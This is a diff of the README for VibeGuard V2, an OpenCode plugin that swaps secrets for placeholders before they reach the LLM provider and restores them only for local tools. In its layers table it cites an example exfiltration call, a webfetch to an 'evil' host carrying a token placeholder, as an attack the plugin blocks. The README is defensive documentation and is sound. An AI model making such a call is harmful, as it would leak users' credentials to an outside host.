@@ -1,257 +1,141 @@
 # opencode-vibeguard-v2
 
-VibeGuard for OpenCode **V2**. Ported from the V1 plugin
+VibeGuard for OpenCode **V2** (tested on **2.0.32**). Originally ported from the V1 plugin
 [`opencode-vibeguard@0.1.0`](https://github.com/inkdust2021/opencode-vibeguard) (MIT, by inkdust2021).
 
-Replaces configured sensitive strings with `__VG_<CATEGORY>_<hash12>__` placeholders **before requests
-reach the LLM provider**, and restores them **before local tools execute** so tools always run with
-real values.
+Secrets, passwords and other sensitive values reach the LLM provider **only as placeholders**
+(`__VG_<NAME>_<hash12>__`). Real values are restored locally: right before a tool runs, and in the
+streamed answer you see.
+
+```
+you / files / tools ──► [structural redaction] ──► [raw payload safety net] ──► provider
+                                                                               │
+tool runs with real value ◄── [per-tool restore policy] ◄── placeholders ◄─────┘
+answer shows real value   ◄── [stream restore, text only]
+```
+
+## Layers
+
+| # | Layer | OpenCode V2 hook | Purpose |
+|---|-------|------------------|---------|
+| 1 | Known secrets | – | Exact values from a secrets list, env vars, OpenCode `auth.json`, password-manager commands, protected files (+ base64 / URL variants). Stable named placeholders that survive restarts. |
+| 2 | Pattern detection | – | 40+ provider token formats, full private-key blocks, URL passwords, auth headers, JWTs, `password = ...` assignments (value only, with false-positive filters). Optional PII (email, IBAN, credit card, ...). |
+| 3 | Structural redaction | `session.hook("context" \| "compaction" \| "generate" \| "title")` | System parts, text/reasoning/compaction parts, tool-call inputs and tool results (copy-on-write), text attachments. Adds a short system hint explaining placeholders. |
+| 4 | Raw safety net | `session.hook("http.request")`, `experimental.ws.send` | Scans the final provider payload for known values (incl. JSON-escaped forms) and strong token formats. `redact` or `block`. With `debug`, logs the JSON paths (never values) of anything layer 3 missed. |
+| 5 | Tool restore policy | `tool.hook("execute.before")` | Restores real values for local tools. Per tool: `allow` / `ask` (permission prompt, once per session) / `deny` / `keep`. Prevents exfiltration such as `webfetch("https://evil/?k=__VG_TOKEN__")`. Unknown/invented placeholders fail the call instead of being written into files. |
+| 6 | Stream restore | `session.hook("http.response")`, `experimental.ws.receive` | Restores placeholders in streamed **answer text** (SSE: OpenAI chat/Responses, Anthropic, Gemini), with a hold-back buffer for placeholders split across token deltas. Tool arguments and reasoning stay untouched. |
+| 7 | Secret-file guard | `permission.hook("evaluate")` | Denies `read` of registered secret files (secrets lists, protected files, `auth.json`, `opencode.db`) and asks before `shell` commands that reference them. |
+| – | Prompt at rest (opt-in) | `session.hook("prompt")` | `redact_prompt: true` stores your prompt with placeholders. |
+
+Everything fails closed by default: if redaction throws, the model request is blocked.
 
 ## Install
 
 ```sh
-# from GitHub (this fork, hardening branch)
-opencode plugin add github:famewolf/opencode-vibeguard-v2
-
-# from a local checkout
-opencode plugin add /absolute/path/to/opencode-vibeguard-v2
-
-# or via config
-# "plugins": ["github:famewolf/opencode-vibeguard-v2"]
+git clone -b opencode-2.0.32 https://github.com/olobarius/opencode-vibeguard-v2.git
 ```
 
-OpenCode V2 also auto-discovers global plugins from `~/.config/opencode/plugins/`; dropping this
-directory there works too.
+Add the absolute path to `plugins` in `~/.config/opencode/opencode.jsonc`:
 
-## Setup (5 minutes)
+```jsonc
+{ "plugins": ["C:/Users/me/opencode-plugins/opencode-vibeguard-v2"] }
+```
 
-1. **Create a config.** Copy `vibeguard.config.json.example` to one of the lookup
-   locations (`./vibeguard.config.json`, `./.opencode/vibeguard.config.json`, or
-   the global `~/.config/opencode/vibeguard.config.json`) and set
-   `"enabled": true`. Without a config the plugin is a no-op and logs a loud
-   `DISABLED` error — check for that line on first run.
-2. **Register your secret files.** Either one flag to track the cc-safety-net
-   deny list (recommended, see below):
-   ```json
-   { "patterns": { "import_deny_paths": true } }
-   ```
-   or point at files directly:
-   ```json
-   { "patterns": { "protected_files": ["/home/user/.config/myapp/token"] } }
-   ```
-3. **Verify.** Set `"debug": true`, restart opencode, and look for
-   `[opencode-vibeguard] protected files: N secret(s) from M file(s)` (counts
-   only, never values) plus `pre-request redaction: N fragment(s)` on the first
-   request that touches a secret.
-
-## Recommended pairing: cc-safety-net
-
-This plugin and [cc-safety-net](https://github.com/kenryu42/cc-safety-net) solve
-opposite halves of the same leak. cc-safety-net stops the model from *reading*
-sensitive files into the session; vibeguard stops anything already in the
-session from *reaching the provider*. Either one alone leaves a gap — tokens
-have leaked into sessions past cc-safety-net, and vibeguard alone cannot stop a
-`read` of a secret file. Run both.
-
-Manage the shared deny list with the bundled script (Node 20+, no dependencies).
-It works with or without cc-safety-net installed — it only reads and writes the
-policy file, and `--init` creates an empty one if none exists:
+Then create the config and your secrets list:
 
 ```sh
-# first time without cc-safety-net: create an empty policy file
-node scripts/add-deny-path.mjs --init
-# register a file (absolute paths only, idempotent)
-node scripts/add-deny-path.mjs /absolute/path/to/secret-file
-# show what is registered
-node scripts/add-deny-path.mjs list
-# custom policy location (mirrors the deny_policy config option)
-node scripts/add-deny-path.mjs --policy /path/to/policy.json list
+cp vibeguard.config.jsonc.example ~/.config/opencode/vibeguard.config.jsonc
+cp vibeguard.secrets.example      ~/.config/opencode/vibeguard.secrets   # then edit
 ```
 
-Standalone vs paired: on its own, vibeguard keeps registered files' contents
-from reaching the provider, but nothing stops the model from reading them into
-the session in plaintext (local transcripts still hold the real values).
-cc-safety-net provides that second half by blocking sensitive tool calls. Either
-tool helps alone; together they cover both directions.
+Restart the OpenCode service (`opencode service restart`). Without a config the plugin is a
+no-op and logs a loud `DISABLED` error. Plugin `options` from `opencode.jsonc` are merged over
+the file config (or replace it when no file exists).
 
-With `"import_deny_paths": true`, every registered file is re-read at each
-plugin setup, so no re-export step is needed when the list changes.
+Zero runtime dependencies; Node builtins only. Works in OpenCode's Bun runtime and Node 20+.
 
-## How it maps to the V2 plugin API
+## The secrets list (recommended)
 
-| V1 hook | V2 equivalent |
-| --- | --- |
-| `experimental.chat.messages.transform` | `ctx.session.hook("context" \| "compaction" \| "generate" \| "title")` |
-| `tool.execute.before` | `ctx.tool.hook("execute.before")` |
-| `experimental.text.complete` | ❌ not available in OpenCode 2.0.1 (see below) |
+Pattern detection cannot know your Wi-Fi password, a customer name or a bare hex token. List
+them, and they are matched exactly, everywhere, including base64 and URL-encoded copies:
 
-The port redacts `text` / `reasoning` / `compaction` parts, `tool-call` inputs, `tool-result`
-outputs, and system parts (`event.system[].text`, which V1 could not see).
+```dotenv
+# ~/.config/opencode/vibeguard.secrets
+GITHUB_PAT=github_pat_11AB...
+DB_PASSWORD="correct horse battery staple"
+CUSTOMER_NAME="Acme Rocket Corp"
+my-old-wifi-password
+```
 
-## Known limitation: placeholders in the transcript
+* `NAME=value` produces `__VG_NAME_<hash>__`; bare lines produce `__VG_SECRET_<hash>__`.
+* Placeholders derive from a per-installation master key (plugin storage), so they are
+  stable across sessions and restarts. They can always be restored, even after compaction.
+* The file is hot-reloaded (`secrets.reload_interval`) and blocked for `read` by the model.
+* A project-local list `.opencode/vibeguard.secrets` is also read.
 
-V2 has no working response-side restore hook on OpenCode 2.0.1. If the model echoes a placeholder in
-assistant text, the local transcript shows the placeholder. Tested and rejected:
-
-| Approach | Result |
-| --- | --- |
-| `ctx.aisdk.hook("language", ...)` wrapping `LanguageModelV3` | Hooks register (`ctx.aisdk` exists) but are never triggered by the runtime |
-| `ctx.session.hook("http.response", ...)` replacing the response body | Hook fires, but the replaced `event.response` is discarded: the trigger wraps object fields in immer drafts and resets the field with `finishDraft(draft)` after hooks |
-| `session.text.ended` event | Read-only, cannot write back |
-
-What still works: the provider never sees plaintext, and tools always receive restored values
-(including `write` / `edit` / `bash`). Only the rendered/stored assistant text keeps placeholders.
-
-Practical asymmetry:
-
-- Tool **results** and files contain real values (they are stored as produced, e.g. a `read` or
-  `browser.tabs.list` result shows real IDs).
-- Model-authored **text** and **tool-call arguments** keep placeholders in the transcript, because
-  OpenCode persists the model output before the `execute.before` restore runs and offers no API to
-  rewrite stored messages. The execution itself still uses the restored values.
-
-Wanted? File an upstream feature request for a text-mutation hook (the V1
-`experimental.text.complete` equivalent).
+Other known-value sources (on by default): env vars with sensitive names (`*_TOKEN`,
+`*_SECRET`, `*PASSWORD*`, `*_API_KEY`, `DATABASE_URL`, ...) and OpenCode's own credential store.
+Password managers: `secrets.commands` (e.g. `pass`, `op read`, `Get-Secret`).
 
 ## Config
 
-Config lookup order (first match wins):
+Lookup order (first match wins): `$OPENCODE_VIBEGUARD_CONFIG`, `./vibeguard.config.json(c)`,
+`./.opencode/vibeguard.config.json(c)`, `~/.config/opencode/vibeguard.config.json(c)`.
+JSONC comments and trailing commas are allowed; UTF-8 BOM is tolerated.
 
-1. `OPENCODE_VIBEGUARD_CONFIG` env var
-2. `<location>/vibeguard.config.json`
-3. `<location>/.opencode/vibeguard.config.json`
-4. `~/.config/opencode/vibeguard.config.json`
+See [`vibeguard.config.jsonc.example`](vibeguard.config.jsonc.example) for every option with
+defaults and comments.
 
-Plugin instances are location-scoped, so project configs are found before the global one. The plugin
-is a no-op when no config is found or `enabled=false`. See `vibeguard.config.json.example`.
+### Tool restore policy
 
-Invalid regex rules are skipped at setup with an error log instead of breaking every model request.
-
-Builtin patterns: `email`, `china_phone`, `china_id`, `uuid`, `ipv4`, `mac`,
-plus the `secrets` group (on by default): OpenAI/Anthropic/Google keys, GitHub
-`gh[pousr]_` + `github_pat_`, GitLab, AWS access/secret, Slack tokens + webhooks,
-Stripe, npm/PyPI, private-key headers, password-bearing database URLs, and generic
-`password = ...` / `api_key: ...` assignments. Omit `builtin` to get `secrets`;
-pass an explicit list (even `[]`) to opt out. `ipv4` validates 0-255 per octet
-(`999.999.999.999` is left alone).
-
-The plugin is a no-op when no config is found or `enabled=false`, and now logs a
-loud `DISABLED` error in that case instead of staying silent.
-
-## Adding your own content
-
-Four ways, from simplest to most explicit. They compose: everything found by any
-method is protected.
-
-**1. Do nothing (recommended start).** The `secrets` builtin group is on by
-default and covers the common token shapes (OpenAI, Anthropic, Google, GitHub,
-GitLab, AWS, Slack, Stripe, npm/PyPI, private keys, password-bearing database
-URLs, generic `password = ...` assignments). If you never set `builtin`, you
-already have it. This catches secret *shapes* but not arbitrary values like a
-bare hex token with no prefix.
-
-**2. Track the cc-safety-net deny list.** One flag imports every file registered
-with the `add-deny-path` tool (`~/.cc-safety-net/policy.json`):
-
-```json
-{ "patterns": { "import_deny_paths": true } }
-```
-
-Flow: `add-deny-path /absolute/path/to/secret-file` once, restart opencode, and
-that file's contents are redacted front-side from then on. Override the policy
-location with `"deny_policy": "/path/to/policy.json"`. To add a single file
-without the deny list, or to include files the deny list does not cover, use
-`protected_files`:
-
-```json
-{ "patterns": { "protected_files": ["/home/user/.config/myapp/token"] } }
-```
-
-Both are read at plugin setup (64KB cap per file). Supported layouts: a file
-holding one bare token, `KEY=VALUE` lines (`.env`, shell exports, quoting
-stripped), and `KEY: VALUE` lines (yaml). Blank lines, `#` comments, short
-values (under `min_secret_len`, default 8), and placeholder words (`changeme`,
-`xxx`, ...) are skipped. Unreadable files log a warning with the path and
-reason, never a crash, and values are never written to logs or stdout.
-
-**3. Static keyword export.** Prefer live tracking (option 2), but if you want
-values pinned in the config, export them once:
-
-```sh
-node scripts/sync-deny-paths.mjs --out vibeguard.keywords.json
-# paste the keywords array into vibeguard.config.json under patterns.keywords
-```
-
-The script prints counts only, never secret values. Re-run it whenever the deny
-list changes; the live `import_deny_paths` option avoids this entirely.
-
-**4. Hand-written keywords and regex.** For one-off values and in-house formats:
-
-```json
-{
-  "patterns": {
-    "keywords": [{ "value": "my-api-key-123", "category": "API_KEY" }],
-    "regex": [{ "pattern": "my-internal-token-[0-9]+", "category": "INTERNAL_TOKEN" }],
-    "exclude": ["safe-to-show.example.com"]
+```jsonc
+"restore": {
+  "tools": {
+    "execute": "keep",          // Code Mode: placeholders stay; nested tool calls are checked individually
+    "webfetch": "ask",          // permission prompt "vibeguard_secret" (once per session + tool)
+    "websearch": "deny",        // the call fails with an explanatory error
+    "chrome-devtools_*": "ask", // MCP tools: <server>_<tool>, wildcards allowed
+    "*": "allow"
   }
 }
 ```
 
-Keywords are literal case-sensitive matches; regex entries accept an optional
-`"flags"` string. `category` becomes part of the placeholder
-(`__VG_<CATEGORY>_<hash>__`) — keep it descriptive so transcript placeholders
-stay readable. Invalid regexes are skipped with an error log at setup.
+A user-supplied `tools` object replaces the defaults, so keep a trailing `"*"` rule.
 
-Check what is active with `"debug": true` (or `OPENCODE_VIBEGUARD_DEBUG=1`): setup
-logs the config source plus `protected files: N secret(s) from M file(s)` —
-counts only.
+## Pairing with cc-safety-net
 
-Debug: set `"debug": true` in the config or `OPENCODE_VIBEGUARD_DEBUG=1`. Debug writes load
-diagnostics to `<tmpdir>/opencode-vibeguard-trace.log`.
+[cc-safety-net](https://github.com/kenryu42/cc-safety-net) blocks destructive commands and
+secret-file access by static analysis of shell commands (PowerShell and POSIX) and tool calls.
+VibeGuard layer 7 is a lightweight subset for registered files only. Running both is
+recommended: cc-safety-net keeps secrets out of the session, VibeGuard keeps whatever got in
+away from the provider. With `"import_deny_paths": true`, files on cc-safety-net's
+`secret_protection.deny_paths` list become known secrets here too. Manage that list with
+`node scripts/add-deny-path.mjs` (works without cc-safety-net installed).
 
-## Protecting file contents (tokens, .env, yaml)
+## Limits
 
-Point the plugin at files whose contents must never reach the provider:
+* Redaction is text-based. Images and PDFs are not inspected (text attachments are).
+* Detection of unknown secrets is heuristic. Put anything important in the secrets list.
+* Tool-call arguments in the transcript show placeholders (by design: the policy decides at
+  execution time). The model's reasoning keeps placeholders, because providers echo reasoning
+  back through provider metadata and some sign it.
+* Plugins calling `ctx.generate.text` bypass session hooks; their requests are not redacted.
+* The local transcript (`opencode.db`) still contains secrets you typed, unless `redact_prompt`
+  is enabled, and tool outputs as produced.
 
-```json
-{
-  "patterns": {
-    "protected_files": ["/home/user/.config/myapp/token", "/home/user/project/.env"],
-    "min_secret_len": 8,
-    "import_deny_paths": true
-  }
-}
-```
+## Debug
 
-Each file is read at setup (64KB cap) and every `KEY=VALUE` / `KEY: VALUE` value
-or single-token line becomes a keyword. Unreadable files log a warning, never a
-crash, and values are never logged.
-
-To ingest your cc-safety-net deny list, either set `"import_deny_paths": true`
-(reads `~/.cc-safety-net/policy.json`, override with `"deny_policy"`), or export
-a static snippet:
-
-```sh
-node scripts/sync-deny-paths.mjs --out vibeguard.keywords.json
-# paste the keywords array into vibeguard.config.json under patterns.keywords
-```
-
-The script prints counts only, never secret values.
-
-## Reliability notes
-
-- Sessions are bounded (`session.max_sessions`, default 50, LRU-evicted).
-- Inputs over `patterns.max_text_chars` (default 500000) are scanned up to the
-  cap and flagged; the tail passes through and a debug warning is logged.
-- `redactDeep`/`restoreDeep` walk `Array`, plain objects, `Map`, and `Set`.
+`"debug": true` or `OPENCODE_VIBEGUARD_DEBUG=1` writes counts-only JSON lines to
+`<tmpdir>/opencode-vibeguard-trace.log`: `load`, `request`, `http.request` (+ `paths` of
+anything the structural pass missed), `http.response`, `tool.restore`, `tool.deny`,
+`protect.read`, ...
 
 ## Development
 
 ```sh
-npm test
+npm test                                   # Node
+BUN_BE_BUN=1 opencode-cli test ./test/     # OpenCode's own Bun runtime
 ```
-
-Requires Node 20+. Zero runtime dependencies; the plugin only uses Node builtins.
 
 ## License
 
